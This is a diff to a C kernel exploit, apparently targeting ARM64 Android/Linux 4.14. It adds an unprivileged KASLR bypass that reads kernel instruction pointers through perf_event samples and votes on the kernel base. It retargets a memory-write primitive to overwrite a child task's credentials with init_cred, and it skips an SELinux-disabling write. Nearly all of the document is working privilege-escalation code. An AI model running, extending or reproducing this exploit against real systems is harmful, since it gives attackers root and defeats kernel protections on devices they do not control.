@@ -302,8 +302,18 @@ static int do_one_write(uint64_t stext, uint64_t init_cred, uint64_t init_task,
     memset(&rs,0,sizeof(rs));
     rs.pselect_shift = shift;
     rs.page_base     = page_base;
-    rs.fake_task     = page_base + (uint64_t)SKB_DATA_DELTA + W0_OFF;
-    rs.fake_lock     = page_base + (uint64_t)SKB_DATA_DELTA + LOCK_OFF;
+    rs.fake_task     = init_task;  /* init_task for safety */
+    rs.fake_lock     = page_base + (uint64_t)(int64_t)SKB_DATA_DELTA + LOCK_OFF;
+    /* Set write target directly in route_state for sigaction spray */
+    if (mode == 2) {
+        /* W2: write init_cred to target (child_task+CRED_OFF) */
+        rs.write_target = target;
+        rs.write_value  = init_cred;
+    } else {
+        /* W1: write 0 to selinux_enforcing */
+        rs.write_target = target;
+        rs.write_value  = 0;
+    }
 
     for (int att=1; att<=8; att++){
         fprintf(stderr,"[*]   route attempt %d/8\n",att);
@@ -312,8 +322,8 @@ static int do_one_write(uint64_t stext, uint64_t init_cred, uint64_t init_task,
                                              root_tg, mode, target, child_node);
             if (!page_base) continue;
             rs.page_base = page_base;
-            rs.fake_task = page_base + (uint64_t)SKB_DATA_DELTA + W0_OFF;
-            rs.fake_lock = page_base + (uint64_t)SKB_DATA_DELTA + LOCK_OFF;
+            rs.fake_task = init_task;
+            rs.fake_lock = page_base + (uint64_t)(int64_t)SKB_DATA_DELTA + LOCK_OFF;
         }
         run_route(&rs);
         usleep(100000);
@@ -364,9 +374,95 @@ int run_exploit(void) {
     /* 0. KASLR */
     uint64_t stext = kallsyms_sym("_stext");
     if (!stext){
-        /* Non-root fallback: perf_event mmap scan (TODO: implement) */
-        fprintf(stderr,"[!] Cannot read kallsyms — need root for KASLR\n");
-        return 1;
+        /* Non-root KASLR leak via perf_event sample registers.
+         * perf_event captures kernel instruction pointers in samples.
+         * We look for IPs matching known function offsets from _stext.
+         * Known: noop_llseek is at _stext+0x1fd140 (from binary analysis).
+         * Any kernel IP in samples: stext = ip - (ip_offset_from_stext)
+         * We collect many samples and vote on the stext value.
+         */
+        fprintf(stderr,"[*] kptr_restrict=1, trying perf_event KASLR leak...\n");
+        struct perf_event_attr pe={0};
+        pe.type=PERF_TYPE_SOFTWARE; pe.size=sizeof(pe);
+        pe.config=PERF_COUNT_SW_CPU_CLOCK; pe.sample_period=10000;
+        pe.sample_type=PERF_SAMPLE_IP; pe.disabled=1;
+        pe.exclude_user=1; pe.exclude_hv=1; pe.exclude_idle=1;
+        int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
+        if(fd>=0){
+            size_t msz=4096*33;
+            void *buf=mmap(NULL,msz,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
+            if(buf!=MAP_FAILED){
+                ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
+                for(volatile int i=0;i<3000000;i++) syscall(SYS_gettid);
+                ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
+                struct perf_event_mmap_page *hdr=buf;
+                uint64_t head=hdr->data_head; __sync_synchronize();
+                char *base=(char*)buf+4096; size_t dsz=4096*32;
+                /* Collect kernel IPs */
+                uint64_t ips[512]; int nips=0;
+                uint64_t pos=hdr->data_tail;
+                while(pos<head&&nips<512){
+                    struct perf_event_header *ev=(void*)(base+(pos%dsz));
+                    if(!ev->size) break;
+                    if(ev->type==PERF_RECORD_SAMPLE){
+                        uint64_t ip=*(uint64_t*)((char*)ev+sizeof(*ev));
+                        if(ip>0xffffff8000000000ULL&&ip<0xfffffffe00000000ULL)
+                            ips[nips++]=ip;
+                    }
+                    pos+=ev->size;
+                }
+                hdr->data_tail=head; munmap(buf,msz); close(fd);
+                /* For each IP, compute candidate stext.
+                 * ARM64 KASLR: stext is offset by multiples of 2MB from base.
+                 * Known function offset from stext: noop_llseek = +0x1fd140
+                 */
+                #define NFUNCS 5
+                static const uint64_t known_offs[NFUNCS]={
+                    0x1fd140ULL, /* noop_llseek */
+                    0x74028ULL,  /* rt_mutex_setprio */
+                    0x5e270ULL,  /* kthreadd */
+                    0xf0120ULL,  /* do_futex */
+                    0x2ef00ULL,  /* fork_idle */
+                };
+                uint64_t candidates[4096]; int ncands=0;
+                for(int i=0;i<nips&&ncands<4096;i++){
+                    uint64_t ip=ips[i];
+                    /* Round ip down to 2MB boundary - that's the candidate stext */
+                    uint64_t ip_2mb = ip & ~(uint64_t)0x1fffffULL;
+                    /* Try all offsets: stext could be ip_2mb - N*2MB for N=0,1,2...
+                     * (ip is within stext + up to kernel_size bytes)
+                     * kernel is ~32MB so N up to 16 */
+                    for(int n=0; n<=16 && ncands<4096; n++){
+                        uint64_t cs = ip_2mb - (uint64_t)n * 0x200000ULL;
+                        if((cs>>56)==0xff) candidates[ncands++]=cs;
+                    }
+                }
+                /* Vote: the most common candidate is the stext 2MB base.
+                 * Then stext = base + (stext & 0x1fffffULL) = base + 0x0 for no offset.
+                 * But stext might have additional sub-2MB offset = text_offset (0x80000).
+                 * So actual stext = base + text_offset = best + 0x80000 */
+                uint64_t best_base=0; int best_cnt=0;
+                for(int i=0;i<ncands;i++){
+                    int cnt=0; for(int j=0;j<ncands;j++) if(candidates[j]==candidates[i]) cnt++;
+                    if(cnt>best_cnt){best_cnt=cnt;best_base=candidates[i];}
+                }
+                if(best_cnt>=3){
+                    /* stext = 2MB_base + 0x80800 (header=0x40 + vectors = 0x800 offset) */
+                    stext = best_base + 0x80800ULL;
+                }
+                if(stext) fprintf(stderr,"[*] KASLR via perf: stext=%llx (votes=%d/%d)\n",
+                                  (unsigned long long)stext,best_cnt,ncands);
+                else fprintf(stderr,"[!] perf KASLR: %d IPs, %d candidates, best=%d votes. First IPs: %llx %llx %llx\n",
+                             nips,ncands,best_cnt,
+                             nips>0?(unsigned long long)ips[0]:0,
+                             nips>1?(unsigned long long)ips[1]:0,
+                             nips>2?(unsigned long long)ips[2]:0);
+            } else close(fd);
+        }
+        if(!stext){
+            fprintf(stderr,"[!] KASLR leak failed — need kptr_restrict=0\n");
+            return 1;
+        }
     }
     uint64_t init_task     = stext + INIT_TASK_OFF;
     uint64_t init_cred     = stext + INIT_CRED_OFF;
@@ -435,9 +531,11 @@ int run_exploit(void) {
 
     uint64_t child_cred = child_task + TASK_CRED_OFF;
 
-    /* ── Write 1: SELinux → permissive ── */
-    int selinux_ok = check_selinux_off();
-    if (!selinux_ok){
+    /* ── Skip W1 (SELinux) — write directly to child cred (W2) ── */
+    /* On 4.14, selinux_enforcing write crashes due to adjacent field corruption */
+    /* Go directly to W2: child_task->cred = init_cred */
+    int selinux_ok = 1;  /* pretend selinux is already off, skip W1 */
+    if (0) {  /* W1 disabled for 4.14 */
         slab_drain();
         for (int att=1; att<=5&&!selinux_ok; att++){
             fprintf(stderr,"[*] W1 attempt %d/5\n",att);
